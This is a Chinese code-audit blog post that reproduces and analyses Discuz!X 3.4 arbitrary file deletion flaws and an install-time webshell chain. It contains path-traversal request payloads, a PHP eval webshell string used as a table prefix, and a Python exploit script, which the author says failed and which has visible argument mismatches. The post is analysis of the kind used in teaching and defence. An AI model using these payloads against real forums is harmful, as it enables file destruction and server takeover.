@@ -1,0 +1,1548 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="Dz系列漏洞, LANVNAL&#39;S Blog">
+    <meta name="description" content="WEB安全、渗透测试、代码审计、20届毕业本科生">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>Dz系列漏洞 | LANVNAL&#39;S Blog</title>
+    <link rel="icon" type="image/png" href="/favicon.png">
+
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
+    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
+
+    <script src="/libs/jquery/jquery.min.js"></script>
+
+<meta name="generator" content="Hexo 4.2.1"><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+
+
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">LANVNAL&#39;S Blog</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories/CTF/" class="waves-effect waves-light">
+      
+      <i class="fas fa-flag" style="zoom: 0.6;"></i>
+      
+      <span>CTF</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories/websec/" class="waves-effect waves-light">
+      
+      <i class="fab fa-internet-explorer" style="zoom: 0.6;"></i>
+      
+      <span>Web安全</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="waves-effect waves-light">
+      
+      <i class="fas fa-code" style="zoom: 0.6;"></i>
+      
+      <span>代码审计</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories/%E9%9D%B6%E6%9C%BA/" class="waves-effect waves-light">
+      
+      <i class="fas fa-server" style="zoom: 0.6;"></i>
+      
+      <span>靶机</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories/other/" class="waves-effect waves-light">
+      
+      <i class="fas fa-align-left" style="zoom: 0.6;"></i>
+      
+      <span>Others</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="" class="waves-effect waves-light">
+
+      
+      <i class="fas fa-list" style="zoom: 0.6;"></i>
+      
+      <span>网站导航</span>
+      <i class="fas fa-chevron-down" aria-hidden="true" style="zoom: 0.6;"></i>
+    </a>
+    <ul class="sub-nav menus_item_child ">
+      
+      <li>
+        <a href="/tags">
+          
+          <i class="fas fa-tags" style="margin-top: -20px; zoom: 0.6;"></i>
+          
+          <span>Tags</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/about">
+          
+          <i class="fas fa-user-circle" style="margin-top: -20px; zoom: 0.6;"></i>
+          
+          <span>About</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/friends">
+          
+          <i class="fas fa-address-book" style="margin-top: -20px; zoom: 0.6;"></i>
+          
+          <span>Friends</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/categories">
+          
+          <i class="fas fa-bookmark" style="margin-top: -20px; zoom: 0.6;"></i>
+          
+          <span>Categories</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/archives">
+          
+          <i class="fas fa-archive" style="margin-top: -20px; zoom: 0.6;"></i>
+          
+          <span>Archives</span>
+        </a>
+      </li>
+      
+    </ul>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">LANVNAL&#39;S Blog</div>
+        <div class="logo-desc">
+            
+            WEB安全、渗透测试、代码审计、20届毕业本科生
+            
+        </div>
+    </div>
+
+    
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories/CTF/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-flag"></i>
+			
+			CTF
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories/websec/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fab fa-internet-explorer"></i>
+			
+			Web安全
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-code"></i>
+			
+			代码审计
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories/%E9%9D%B6%E6%9C%BA/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-server"></i>
+			
+			靶机
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories/other/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-align-left"></i>
+			
+			Others
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="javascript:;">
+			
+				<i class="fa-fw fas fa-list"></i>
+			
+			网站导航
+			<span class="m-icon"><i class="fas fa-chevron-right"></i></span>
+		</a>
+            <ul  style="background:  ;" >
+              
+                <li>
+
+                  <a href="/tags " style="margin-left:75px">
+				  
+				   <i class="fa fas fa-tags" style="position: absolute;left:50px" ></i>
+			      
+		          <span>Tags</span>
+                  </a>
+                </li>
+              
+                <li>
+
+                  <a href="/about " style="margin-left:75px">
+				  
+				   <i class="fa fas fa-user-circle" style="position: absolute;left:50px" ></i>
+			      
+		          <span>About</span>
+                  </a>
+                </li>
+              
+                <li>
+
+                  <a href="/friends " style="margin-left:75px">
+				  
+				   <i class="fa fas fa-address-book" style="position: absolute;left:50px" ></i>
+			      
+		          <span>Friends</span>
+                  </a>
+                </li>
+              
+                <li>
+
+                  <a href="/categories " style="margin-left:75px">
+				  
+				   <i class="fa fas fa-bookmark" style="position: absolute;left:50px" ></i>
+			      
+		          <span>Categories</span>
+                  </a>
+                </li>
+              
+                <li>
+
+                  <a href="/archives " style="margin-left:75px">
+				  
+				   <i class="fa fas fa-archive" style="position: absolute;left:50px" ></i>
+			      
+		          <span>Archives</span>
+                  </a>
+                </li>
+              
+            </ul>
+          
+        </li>
+        
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+    </nav>
+
+</header>
+
+    
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/blog-theme-pic/dz.png')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">Dz系列漏洞</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        width: 345px;
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        margin: 35px 0 15px 0;
+        padding-left: 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content {
+        height: calc(100vh - 250px);
+        overflow: auto;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+
+        position: absolute;
+        right: 23.5vw;
+        display: block;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 15px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">
+                                <span class="chip bg-color">代码审计</span>
+                            </a>
+                        
+                            <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">
+                                <span class="chip bg-color">漏洞复现</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="post-category">
+                                代码审计
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2020-03-23
+                </div>
+                
+
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
+                    2020-03-26
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
+                    4.5k
+                </div>
+                
+
+                
+
+                
+                    <div id="busuanzi_container_page_pv" class="info-break-policy">
+                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
+                        <span id="busuanzi_value_page_pv"></span>
+                    </div>
+				
+            </div>
+        </div>
+        <hr class="clearfix">
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h2 id="Discuz-X-≤3-4-任意文件删除漏洞"><a href="#Discuz-X-≤3-4-任意文件删除漏洞" class="headerlink" title="Discuz!X ≤3.4 任意文件删除漏洞"></a>Discuz!X ≤3.4 任意文件删除漏洞</h2><h3 id="1、简述"><a href="#1、简述" class="headerlink" title="1、简述"></a>1、简述</h3><p><strong>漏洞原因：</strong>之前存在的任意文件删除漏洞修复不完全导致可以绕过。</p>
+<p><strong>漏洞修复时间：</strong>2017年9月29日官方对gitee上的代码进行了<a href="https://gitee.com/ComsenzDiscuz/DiscuzX/commit/7d603a197c2717ef1d7e9ba654cf72aa42d3e574" target="_blank" rel="noopener">修复</a></p>
+<h3 id="2、复现环境"><a href="#2、复现环境" class="headerlink" title="2、复现环境"></a>2、复现环境</h3><p>因为官方提供的下载是最新的源码，漏洞修复时间是17年9月29日，通过git找一个修复前的版本签出就可。</p>
+<pre><code>git checkout 1a912ddb4a62364d1736fa4578b42ecc62c5d0be</code></pre>
+<p>通过安装向导安装完后注册一个测试用户，同时在网站对应目录下创建用于删除的测试文件。</p>
+<h3 id="3、漏洞复现"><a href="#3、漏洞复现" class="headerlink" title="3、漏洞复现"></a>3、漏洞复现</h3><p>登录账户。</p>
+<p>访问该网页：<code>http://127.0.0.1:8001/dz/upload/home.php?mod=spacecp&amp;ac=profile&amp;op=base</code></p>
+<p>发送POST请求：</p>
+<pre><code>http://127.0.0.1:8001/dz/upload/home.php?mod=spacecp&amp;ac=profile&amp;op=base
+POST
+birthprovince=../../../testfile.txt&amp;profilesubmit=1&amp;formhash=e9d84225
+formhash值为用户hash，可在源码中搜索formhash找到。</code></pre>
+<p>请求后表单中的出生地内容变为<code>../../../testfile.txt</code></p>
+<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/dz_3.4_%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/1.png"></p>
+<p>然后构造请求向<code>home.php?mod=spacecp&amp;ac=profile&amp;op=base</code>上传文件，可以修改表单提交达到目的。</p>
+<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/dz_3.4_%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/3.png"></p>
+<p>提交后文件被删除。</p>
+<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/dz_3.4_%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/2.png"></p>
+<h3 id="4、漏洞分析"><a href="#4、漏洞分析" class="headerlink" title="4、漏洞分析"></a>4、漏洞分析</h3><p>分析一下对该页面请求时的流程。</p>
+<p>在<code>home.php</code>的41行有一次对其他文件的请求：</p>
+<pre><code class="php">require_once libfile(&#39;home/&#39;.$mod, &#39;module&#39;);</code></pre>
+<p>因为GET参数不满足上面代码的条件所以进入这部分。</p>
+<p>查看libfile函数的定义：</p>
+<pre><code class="php">function libfile($libname, $folder = &#39;&#39;) &#123;
+    $libpath = &#39;/source/&#39;.$folder;
+    if(strstr($libname, &#39;/&#39;)) &#123;
+        list($pre, $name) = explode(&#39;/&#39;, $libname);
+        $path = &quot;&#123;$libpath&#125;/&#123;$pre&#125;/&#123;$pre&#125;_&#123;$name&#125;&quot;;
+    &#125; else &#123;
+        $path = &quot;&#123;$libpath&#125;/&#123;$libname&#125;&quot;;
+    &#125;
+    return preg_match(&#39;/^[\w\d\/_]+$/i&#39;, $path) ? realpath(DISCUZ_ROOT.$path.&#39;.php&#39;) : false;
+&#125;</code></pre>
+<p>可以看出该函数的功能就是构造文件路径。</p>
+<p>对于复现漏洞时请求页面的GET请求参数：<code>mod=spacecp&amp;ac=profile&amp;op=base</code></p>
+<p>在如上参数的请求时，经过<code>libfile</code>函数处理过后返回的路径为:<code>/source/module/home/home_spacecp.php</code></p>
+<p>跟进到<code>/source/module/home/home_spacecp.php</code>文件，在最后一行也引入了其他的文件,处理方式同上</p>
+<pre><code class="php">require_once libfile(&#39;spacecp/&#39;.$ac, &#39;include&#39;);</code></pre>
+<p>所以这里引入的文件为：<code>/source/include/spacecp/spacecp_profile.php</code>，转到该文件看看。</p>
+<p>在第70行，存在如下条件判断，这里也就是页面上的保存按钮点击后触发的相关处理代码：</p>
+<pre><code class="php">if(submitcheck(&#39;profilesubmit&#39;)) &#123;
+  ......</code></pre>
+<p><code>submitcheck</code>函数是对profilesubmit的安全检查</p>
+<pre><code class="php">function submitcheck($var, $allowget = 0, $seccodecheck = 0, $secqaacheck = 0) &#123;
+    if(!getgpc($var)) &#123;
+        return FALSE;
+    &#125; else &#123;
+        return helper_form::submitcheck($var, $allowget, $seccodecheck, $secqaacheck);
+    &#125;
+&#125;</code></pre>
+<p>第187行开始是对文件上传的处理函数：</p>
+<pre><code class="php">    if($_FILES) &#123;
+        $upload = new discuz_upload();
+        foreach($_FILES as $key =&gt; $file) &#123;
+    ......</code></pre>
+<p>第207行开始：</p>
+<pre><code class="php">if(!$upload-&gt;error()) &#123;
+                $upload-&gt;save();
+
+                if(!$upload-&gt;get_image_info($attach[&#39;target&#39;])) &#123;
+                    @unlink($attach[&#39;target&#39;]);
+                    continue;
+                &#125;
+                $setarr[$key] = &#39;&#39;;
+                $attach[&#39;attachment&#39;] = dhtmlspecialchars(trim($attach[&#39;attachment&#39;]));
+                if($vid &amp;&amp; $verifyconfig[&#39;available&#39;] &amp;&amp; isset($verifyconfig[&#39;field&#39;][$key])) &#123;
+                    if(isset($verifyinfo[&#39;field&#39;][$key])) &#123;
+                        @unlink(getglobal(&#39;setting/attachdir&#39;).&#39;./profile/&#39;.$verifyinfo[&#39;field&#39;][$key]);
+                        $verifyarr[$key] = $attach[&#39;attachment&#39;];
+                    &#125;
+                    continue;
+                &#125;
+                if(isset($setarr[$key]) &amp;&amp; $_G[&#39;cache&#39;][&#39;profilesetting&#39;][$key][&#39;needverify&#39;]) &#123;
+                    @unlink(getglobal(&#39;setting/attachdir&#39;).&#39;./profile/&#39;.$verifyinfo[&#39;field&#39;][$key]);
+                    $verifyarr[$key] = $attach[&#39;attachment&#39;];
+                    continue;
+                &#125;
+                @unlink(getglobal(&#39;setting/attachdir&#39;).&#39;./profile/&#39;.$space[$key]);
+                $setarr[$key] = $attach[&#39;attachment&#39;];
+            &#125;</code></pre>
+<p>文件上传成功，满足<code>!$upload-&gt;error()</code>，会执行到unlink语句：</p>
+<pre><code class="php">@unlink(getglobal(&#39;setting/attachdir&#39;).&#39;./profile/&#39;.$space[$key]);</code></pre>
+<p>这里的<code>$key</code>，在前面<code>foreach($_FILES as $key =&gt; $file)</code>中定义(189行)。<code>$space</code>在第23行定义，为用户个人资料。</p>
+<pre><code class="php">$space = getuserbyuid($_G[&#39;uid&#39;]);
+space_merge($space, &#39;field_home&#39;);
+space_merge($space, &#39;profile&#39;);</code></pre>
+<p>会从数据库查询用户相关的信息保存到变量$space中。<code>birthprovince</code>就是其中之一。</p>
+<p>所以此时<code>$space[key] = $space[birthprovince] = &#39;../../../testfile.txt&#39;</code></p>
+<p>也就解释了复现时修改出生日期为目的文件路径的操作。</p>
+<p>这样的话在这里就完成了文件删除的操作。</p>
+<p>PS：更改用户信息时通过提交表单事时抓包可以看到各参数名称，可以进行修改。</p>
+<h3 id="5、Exp"><a href="#5、Exp" class="headerlink" title="5、Exp"></a>5、Exp</h3><p>exp改了半天也没有攻击成功，找了公开的exp也不成功，不知道是exp问题还是环境问题。</p>
+<pre><code class="python">import requests
+import re
+import os
+
+def check_url(target_url):
+    parameter = target_url.split(&#39;/&#39;)
+    if parameter[-1] != &quot;home.php&quot;:
+            print(&quot;[*] Please make sure the url end with &#39;home.php&#39;&quot;)
+            exit()
+
+def get_cookie(target_url):
+    cookie = input(&quot;[*] Please paste the cookie:&quot;).split(&#39;;&#39;)  
+    cookies = &#123;&#125;
+    for i in range(0,len(cookie)):
+        name,value=cookie[i].strip().split(&#39;=&#39;,1)
+        cookies[name] = value
+    loginurl = target_url + &#39;?mod=spacecp&#39;
+    text = requests.get(target_url,cookies=cookies).text
+    if &#39;您需要先登录才能继续本操作&#39; in text:
+        print(&quot;[*] Login error,please check cookies!&quot;)
+    else:
+        return cookies
+
+
+def del_file(target_url,target_file,cookies):
+    loginurl = target_url + &#39;?mod=spacecp&#39;
+    text = requests.get(target_url,cookies=cookies).text
+    reformhash = &#39;formhash=.*?&amp;&#39;
+    patternformhash = re.compile(reformhash)
+    formhash = patternformhash.search(text).group()[9:17]
+    print(formhash)
+    # set birthprovince
+    birthprovinceurl = target_url + &#39;?mod=spacecp&amp;ac=profile&#39;
+    birthprovincedata =&#123;
+                    &quot;birthprovince&quot;:target_file,
+                    &quot;profilesubmit&quot;:&quot;1&quot;,
+                    &quot;formhash&quot;:formhash
+                    &#125;
+    requests.post(birthprovinceurl,cookies=cookies,data=birthprovincedata)
+    # upload a picture and delete the target file
+    basepath = os.path.abspath(os.path.dirname(__file__))
+    uploadurl = target_url + &#39;?mod=spacecp&amp;ac=profile&amp;op=base&#39;
+    files = &#123;&#39;birthprovince&#39;: (&quot;pic.png&quot;,open(basepath+&#39;/1.png&#39;, &#39;rb&#39;))&#125;
+    data = &#123;
+        &#39;formhash&#39;:formhash,
+        &#39;profilesubmit&#39;:&#39;1&#39;
+        &#125;
+    s=requests.post(uploadurl,cookies=cookies,data=data,files=files)
+    print(s.text)
+    print(&quot;[*] Deleting the file.&quot;)
+
+
+def exp():
+    try:
+        target_url = input(&quot;[*] please input the target url(eg:http://xxxxx/home.php):&quot;)
+        check_url(target_url)
+        cookies,formhash = get_cookie(target_url)
+        target_file = input(&quot;[*] Please input the target file:&quot;)
+        del_file(target_url,target_file,cookies,formhash)
+    except KeyError as e:
+        print(&quot;This poc doesn&#39;t seem to work.&quot;)
+
+if __name__ == &quot;__main__&quot;:
+    exp()   </code></pre>
+<h3 id="5、修复方法"><a href="#5、修复方法" class="headerlink" title="5、修复方法"></a>5、修复方法</h3><p>对比官方的代码变动，直接删除了几条unlink语句，简单暴力..</p>
+<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/dz_3.4_%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/1_5.png"></p>
+<h2 id="Discuz-X-V3-4后台任意文件删除"><a href="#Discuz-X-V3-4后台任意文件删除" class="headerlink" title="Discuz!X V3.4后台任意文件删除"></a>Discuz!X V3.4后台任意文件删除</h2><h3 id="1、简述-1"><a href="#1、简述-1" class="headerlink" title="1、简述"></a>1、简述</h3><p>后台任意文件删除，需要有管理员的权限。</p>
+<h3 id="2、复现环境-1"><a href="#2、复现环境-1" class="headerlink" title="2、复现环境"></a>2、复现环境</h3><p>同上</p>
+<h3 id="3、漏洞复现-1"><a href="#3、漏洞复现-1" class="headerlink" title="3、漏洞复现"></a>3、漏洞复现</h3><p>登陆后台，进入论坛-&gt;模块管理-&gt;编辑板块，使用burp拦截提交的数据。</p>
+<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/dz_3.4_%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/background_files_delete/2_1.png"></p>
+<p>修改请求包，添加参数 <code>&amp;replybgnew=../../../testfile.txt&amp;delreplybg=1</code></p>
+<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/dz_3.4_%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/background_files_delete/2_2.png"></p>
+<p>发送，查看文件发现被删除。</p>
+<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/dz_3.4_%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/background_files_delete/2_3.png"></p>
+<h3 id="4、漏洞分析-1"><a href="#4、漏洞分析-1" class="headerlink" title="4、漏洞分析"></a>4、漏洞分析</h3><p>分析一下该请求的流程。</p>
+<p>请求URL：<code>/dz/upload/admin.php?action=forums&amp;operation=edit&amp;fid=2&amp;replybgnew=../../../testfile.txt&amp;delreplybg=1</code></p>
+<p>在<code>admin.php</code>中接收了action参数，在第58行经过<code>admincpfile</code>函数处理后返回文件路径，并包含该文件。</p>
+<pre><code class="php">    if($admincp-&gt;allow($action, $operation, $do) || $action == &#39;index&#39;) &#123;
+        require $admincp-&gt;admincpfile($action);</code></pre>
+<p>看一下该函数的处理过程：</p>
+<pre><code class="php">    function admincpfile($action) &#123;
+        return &#39;./source/admincp/admincp_&#39;.$action.&#39;.php&#39;;
+    &#125;</code></pre>
+<p>经过处理返回的内容是：<code>./source/admincp/admincp_forums.php</code>，也就来到了漏洞存在的地方。</p>
+<p>根据if/else的判断条件，进入else中的代码：</p>
+<pre><code class="php">if(!submitcheck(&#39;detailsubmit&#39;)) &#123;
+  ......
+&#125;
+else&#123;
+
+&#125;</code></pre>
+<p>造成漏洞的代码：</p>
+<pre><code class="php">if(!$multiset) &#123;
+  if($_GET[&#39;delreplybg&#39;]) &#123;
+    $valueparse = parse_url($_GET[&#39;replybgnew&#39;]);
+    if(!isset($valueparse[&#39;host&#39;]) &amp;&amp; file_exists($_G[&#39;setting&#39;][&#39;attachurl&#39;].&#39;common/&#39;.$_GET[&#39;replybgnew&#39;])) &#123;
+      @unlink($_G[&#39;setting&#39;][&#39;attachurl&#39;].&#39;common/&#39;.$_GET[&#39;replybgnew&#39;]);
+    &#125;
+    $_GET[&#39;replybgnew&#39;] = &#39;&#39;;
+  &#125;</code></pre>
+<p><code>$multiset</code>默认为0，只要不给该参数赋值就满足条件进入if语句。</p>
+<p>第二个if语句，检查GET参数<code>delreplybg</code>有没有内容，然后做了下检测，检测parse_url函数返回的结果中有没有host这个变量，来确保GET参数<code>replybgnew</code>不是url，但是并不影响传入文件路径。</p>
+<p>这里<code>$_G[&#39;setting&#39;][&#39;attachurl&#39;</code>的值为<code>data/attachment/</code>，再拼接上<code>common/</code>和<code>$_GET[&#39;replybgnew&#39;]</code>，这样路径就可控了。通过unlink达到文件删除的目的。</p>
+<h2 id="任意文件删除配合install过程getshell"><a href="#任意文件删除配合install过程getshell" class="headerlink" title="任意文件删除配合install过程getshell"></a>任意文件删除配合install过程getshell</h2><h3 id="1、简述-2"><a href="#1、简述-2" class="headerlink" title="1、简述"></a>1、简述</h3><p>这个方法是看到一篇博客分析的，主要是利用文件删除漏洞删掉<code>install.lock</code>文件，绕过对安装完成的判断能够再进行安装的过程，然后再填写配置信息处构使用构造的表前缀名，时一句话写入配置文件中，getshell。</p>
+<p>表前缀：<code>x&#39;);@eval($_POST[lanvnal]);(&#39;</code></p>
+<p>但是我在使用上面版本v3.4的代码时发现，安装后<code>install</code>目录下不存在<code>index.php</code>了。分析代码发现会有安装后的删除处理，在<code>/source/admincp/admincp_index.php</code>的第14行：</p>
+<pre><code class="php">if(@file_exists(DISCUZ_ROOT.&#39;./install/index.php&#39;) &amp;&amp; !DISCUZ_DEBUG) &#123;
+    @unlink(DISCUZ_ROOT.&#39;./install/index.php&#39;);
+    if(@file_exists(DISCUZ_ROOT.&#39;./install/index.php&#39;)) &#123;
+        dexit(&#39;Please delete install/index.php via FTP!&#39;);
+    &#125;
+&#125;</code></pre>
+<p>那是不是老版本存在该问题呢？</p>
+<p>我翻了历史版本代码，直到git提交的第一个版本都有如上的处理。</p>
+<p>但还是分析一下吧，就当学习了。</p>
+<p><strong>可以利用的条件：</strong>1、安装后没有登录后台，此时install/index还没删除 2、因为其他原因没有删除</p>
+<h3 id="2、复现环境-2"><a href="#2、复现环境-2" class="headerlink" title="2、复现环境"></a>2、复现环境</h3><p>同上</p>
+<h3 id="3、漏洞复现-2"><a href="#3、漏洞复现-2" class="headerlink" title="3、漏洞复现"></a>3、漏洞复现</h3><p>如果安装后<code>install/index.php</code>因为某些原因还存在，直接访问会有如下警告：</p>
+<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/dz_3.4_%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/getshell_with_install/3_1.png"></p>
+<p>通过文件删除漏洞删除data目录下的<code>install.lock</code>文件就可以重新安装。</p>
+<p>安装过程修改表前缀内容为：<code>x&#39;);@eval($_POST[lanvnal]);(&#39;</code></p>
+<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/dz_3.4_%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/getshell_with_install/3_2.png"></p>
+<p>在<code>config/config_ucenter.php</code>中已经写入了webshell。</p>
+<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/dz_3.4_%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/getshell_with_install/3_3.png"></p>
+<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/dz_3.4_%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/getshell_with_install/3_4.png"></p>
+<h3 id="4、漏洞分析-2"><a href="#4、漏洞分析-2" class="headerlink" title="4、漏洞分析"></a>4、漏洞分析</h3><p>分析一下安装逻辑，<code>install/index.php</code>文件的整体流程如下：</p>
+<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/dz_3.4_%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/getshell_with_install/3_5.png"></p>
+<p>分别是我们安装的每一步，接受协议-&gt;环境检测-&gt;是否安装 UCenter Server-&gt;数据库配置信息-&gt;安装过程，生成lock文件-&gt;检查</p>
+<p>问题出在在 <code>db_init</code> 的处理中，在代码第369行：</p>
+<pre><code class="php">        if(DZUCFULL) &#123;
+            install_uc_server();
+        &#125;</code></pre>
+<p>跟进<code>install_uc_server</code>，在1296行可以发现对config参数没做任何过滤传入到<code>save_uc_config</code>中：</p>
+<pre><code class="php">save_uc_config($config, ROOT_PATH.&#39;./config/config_ucenter.php&#39;);</code></pre>
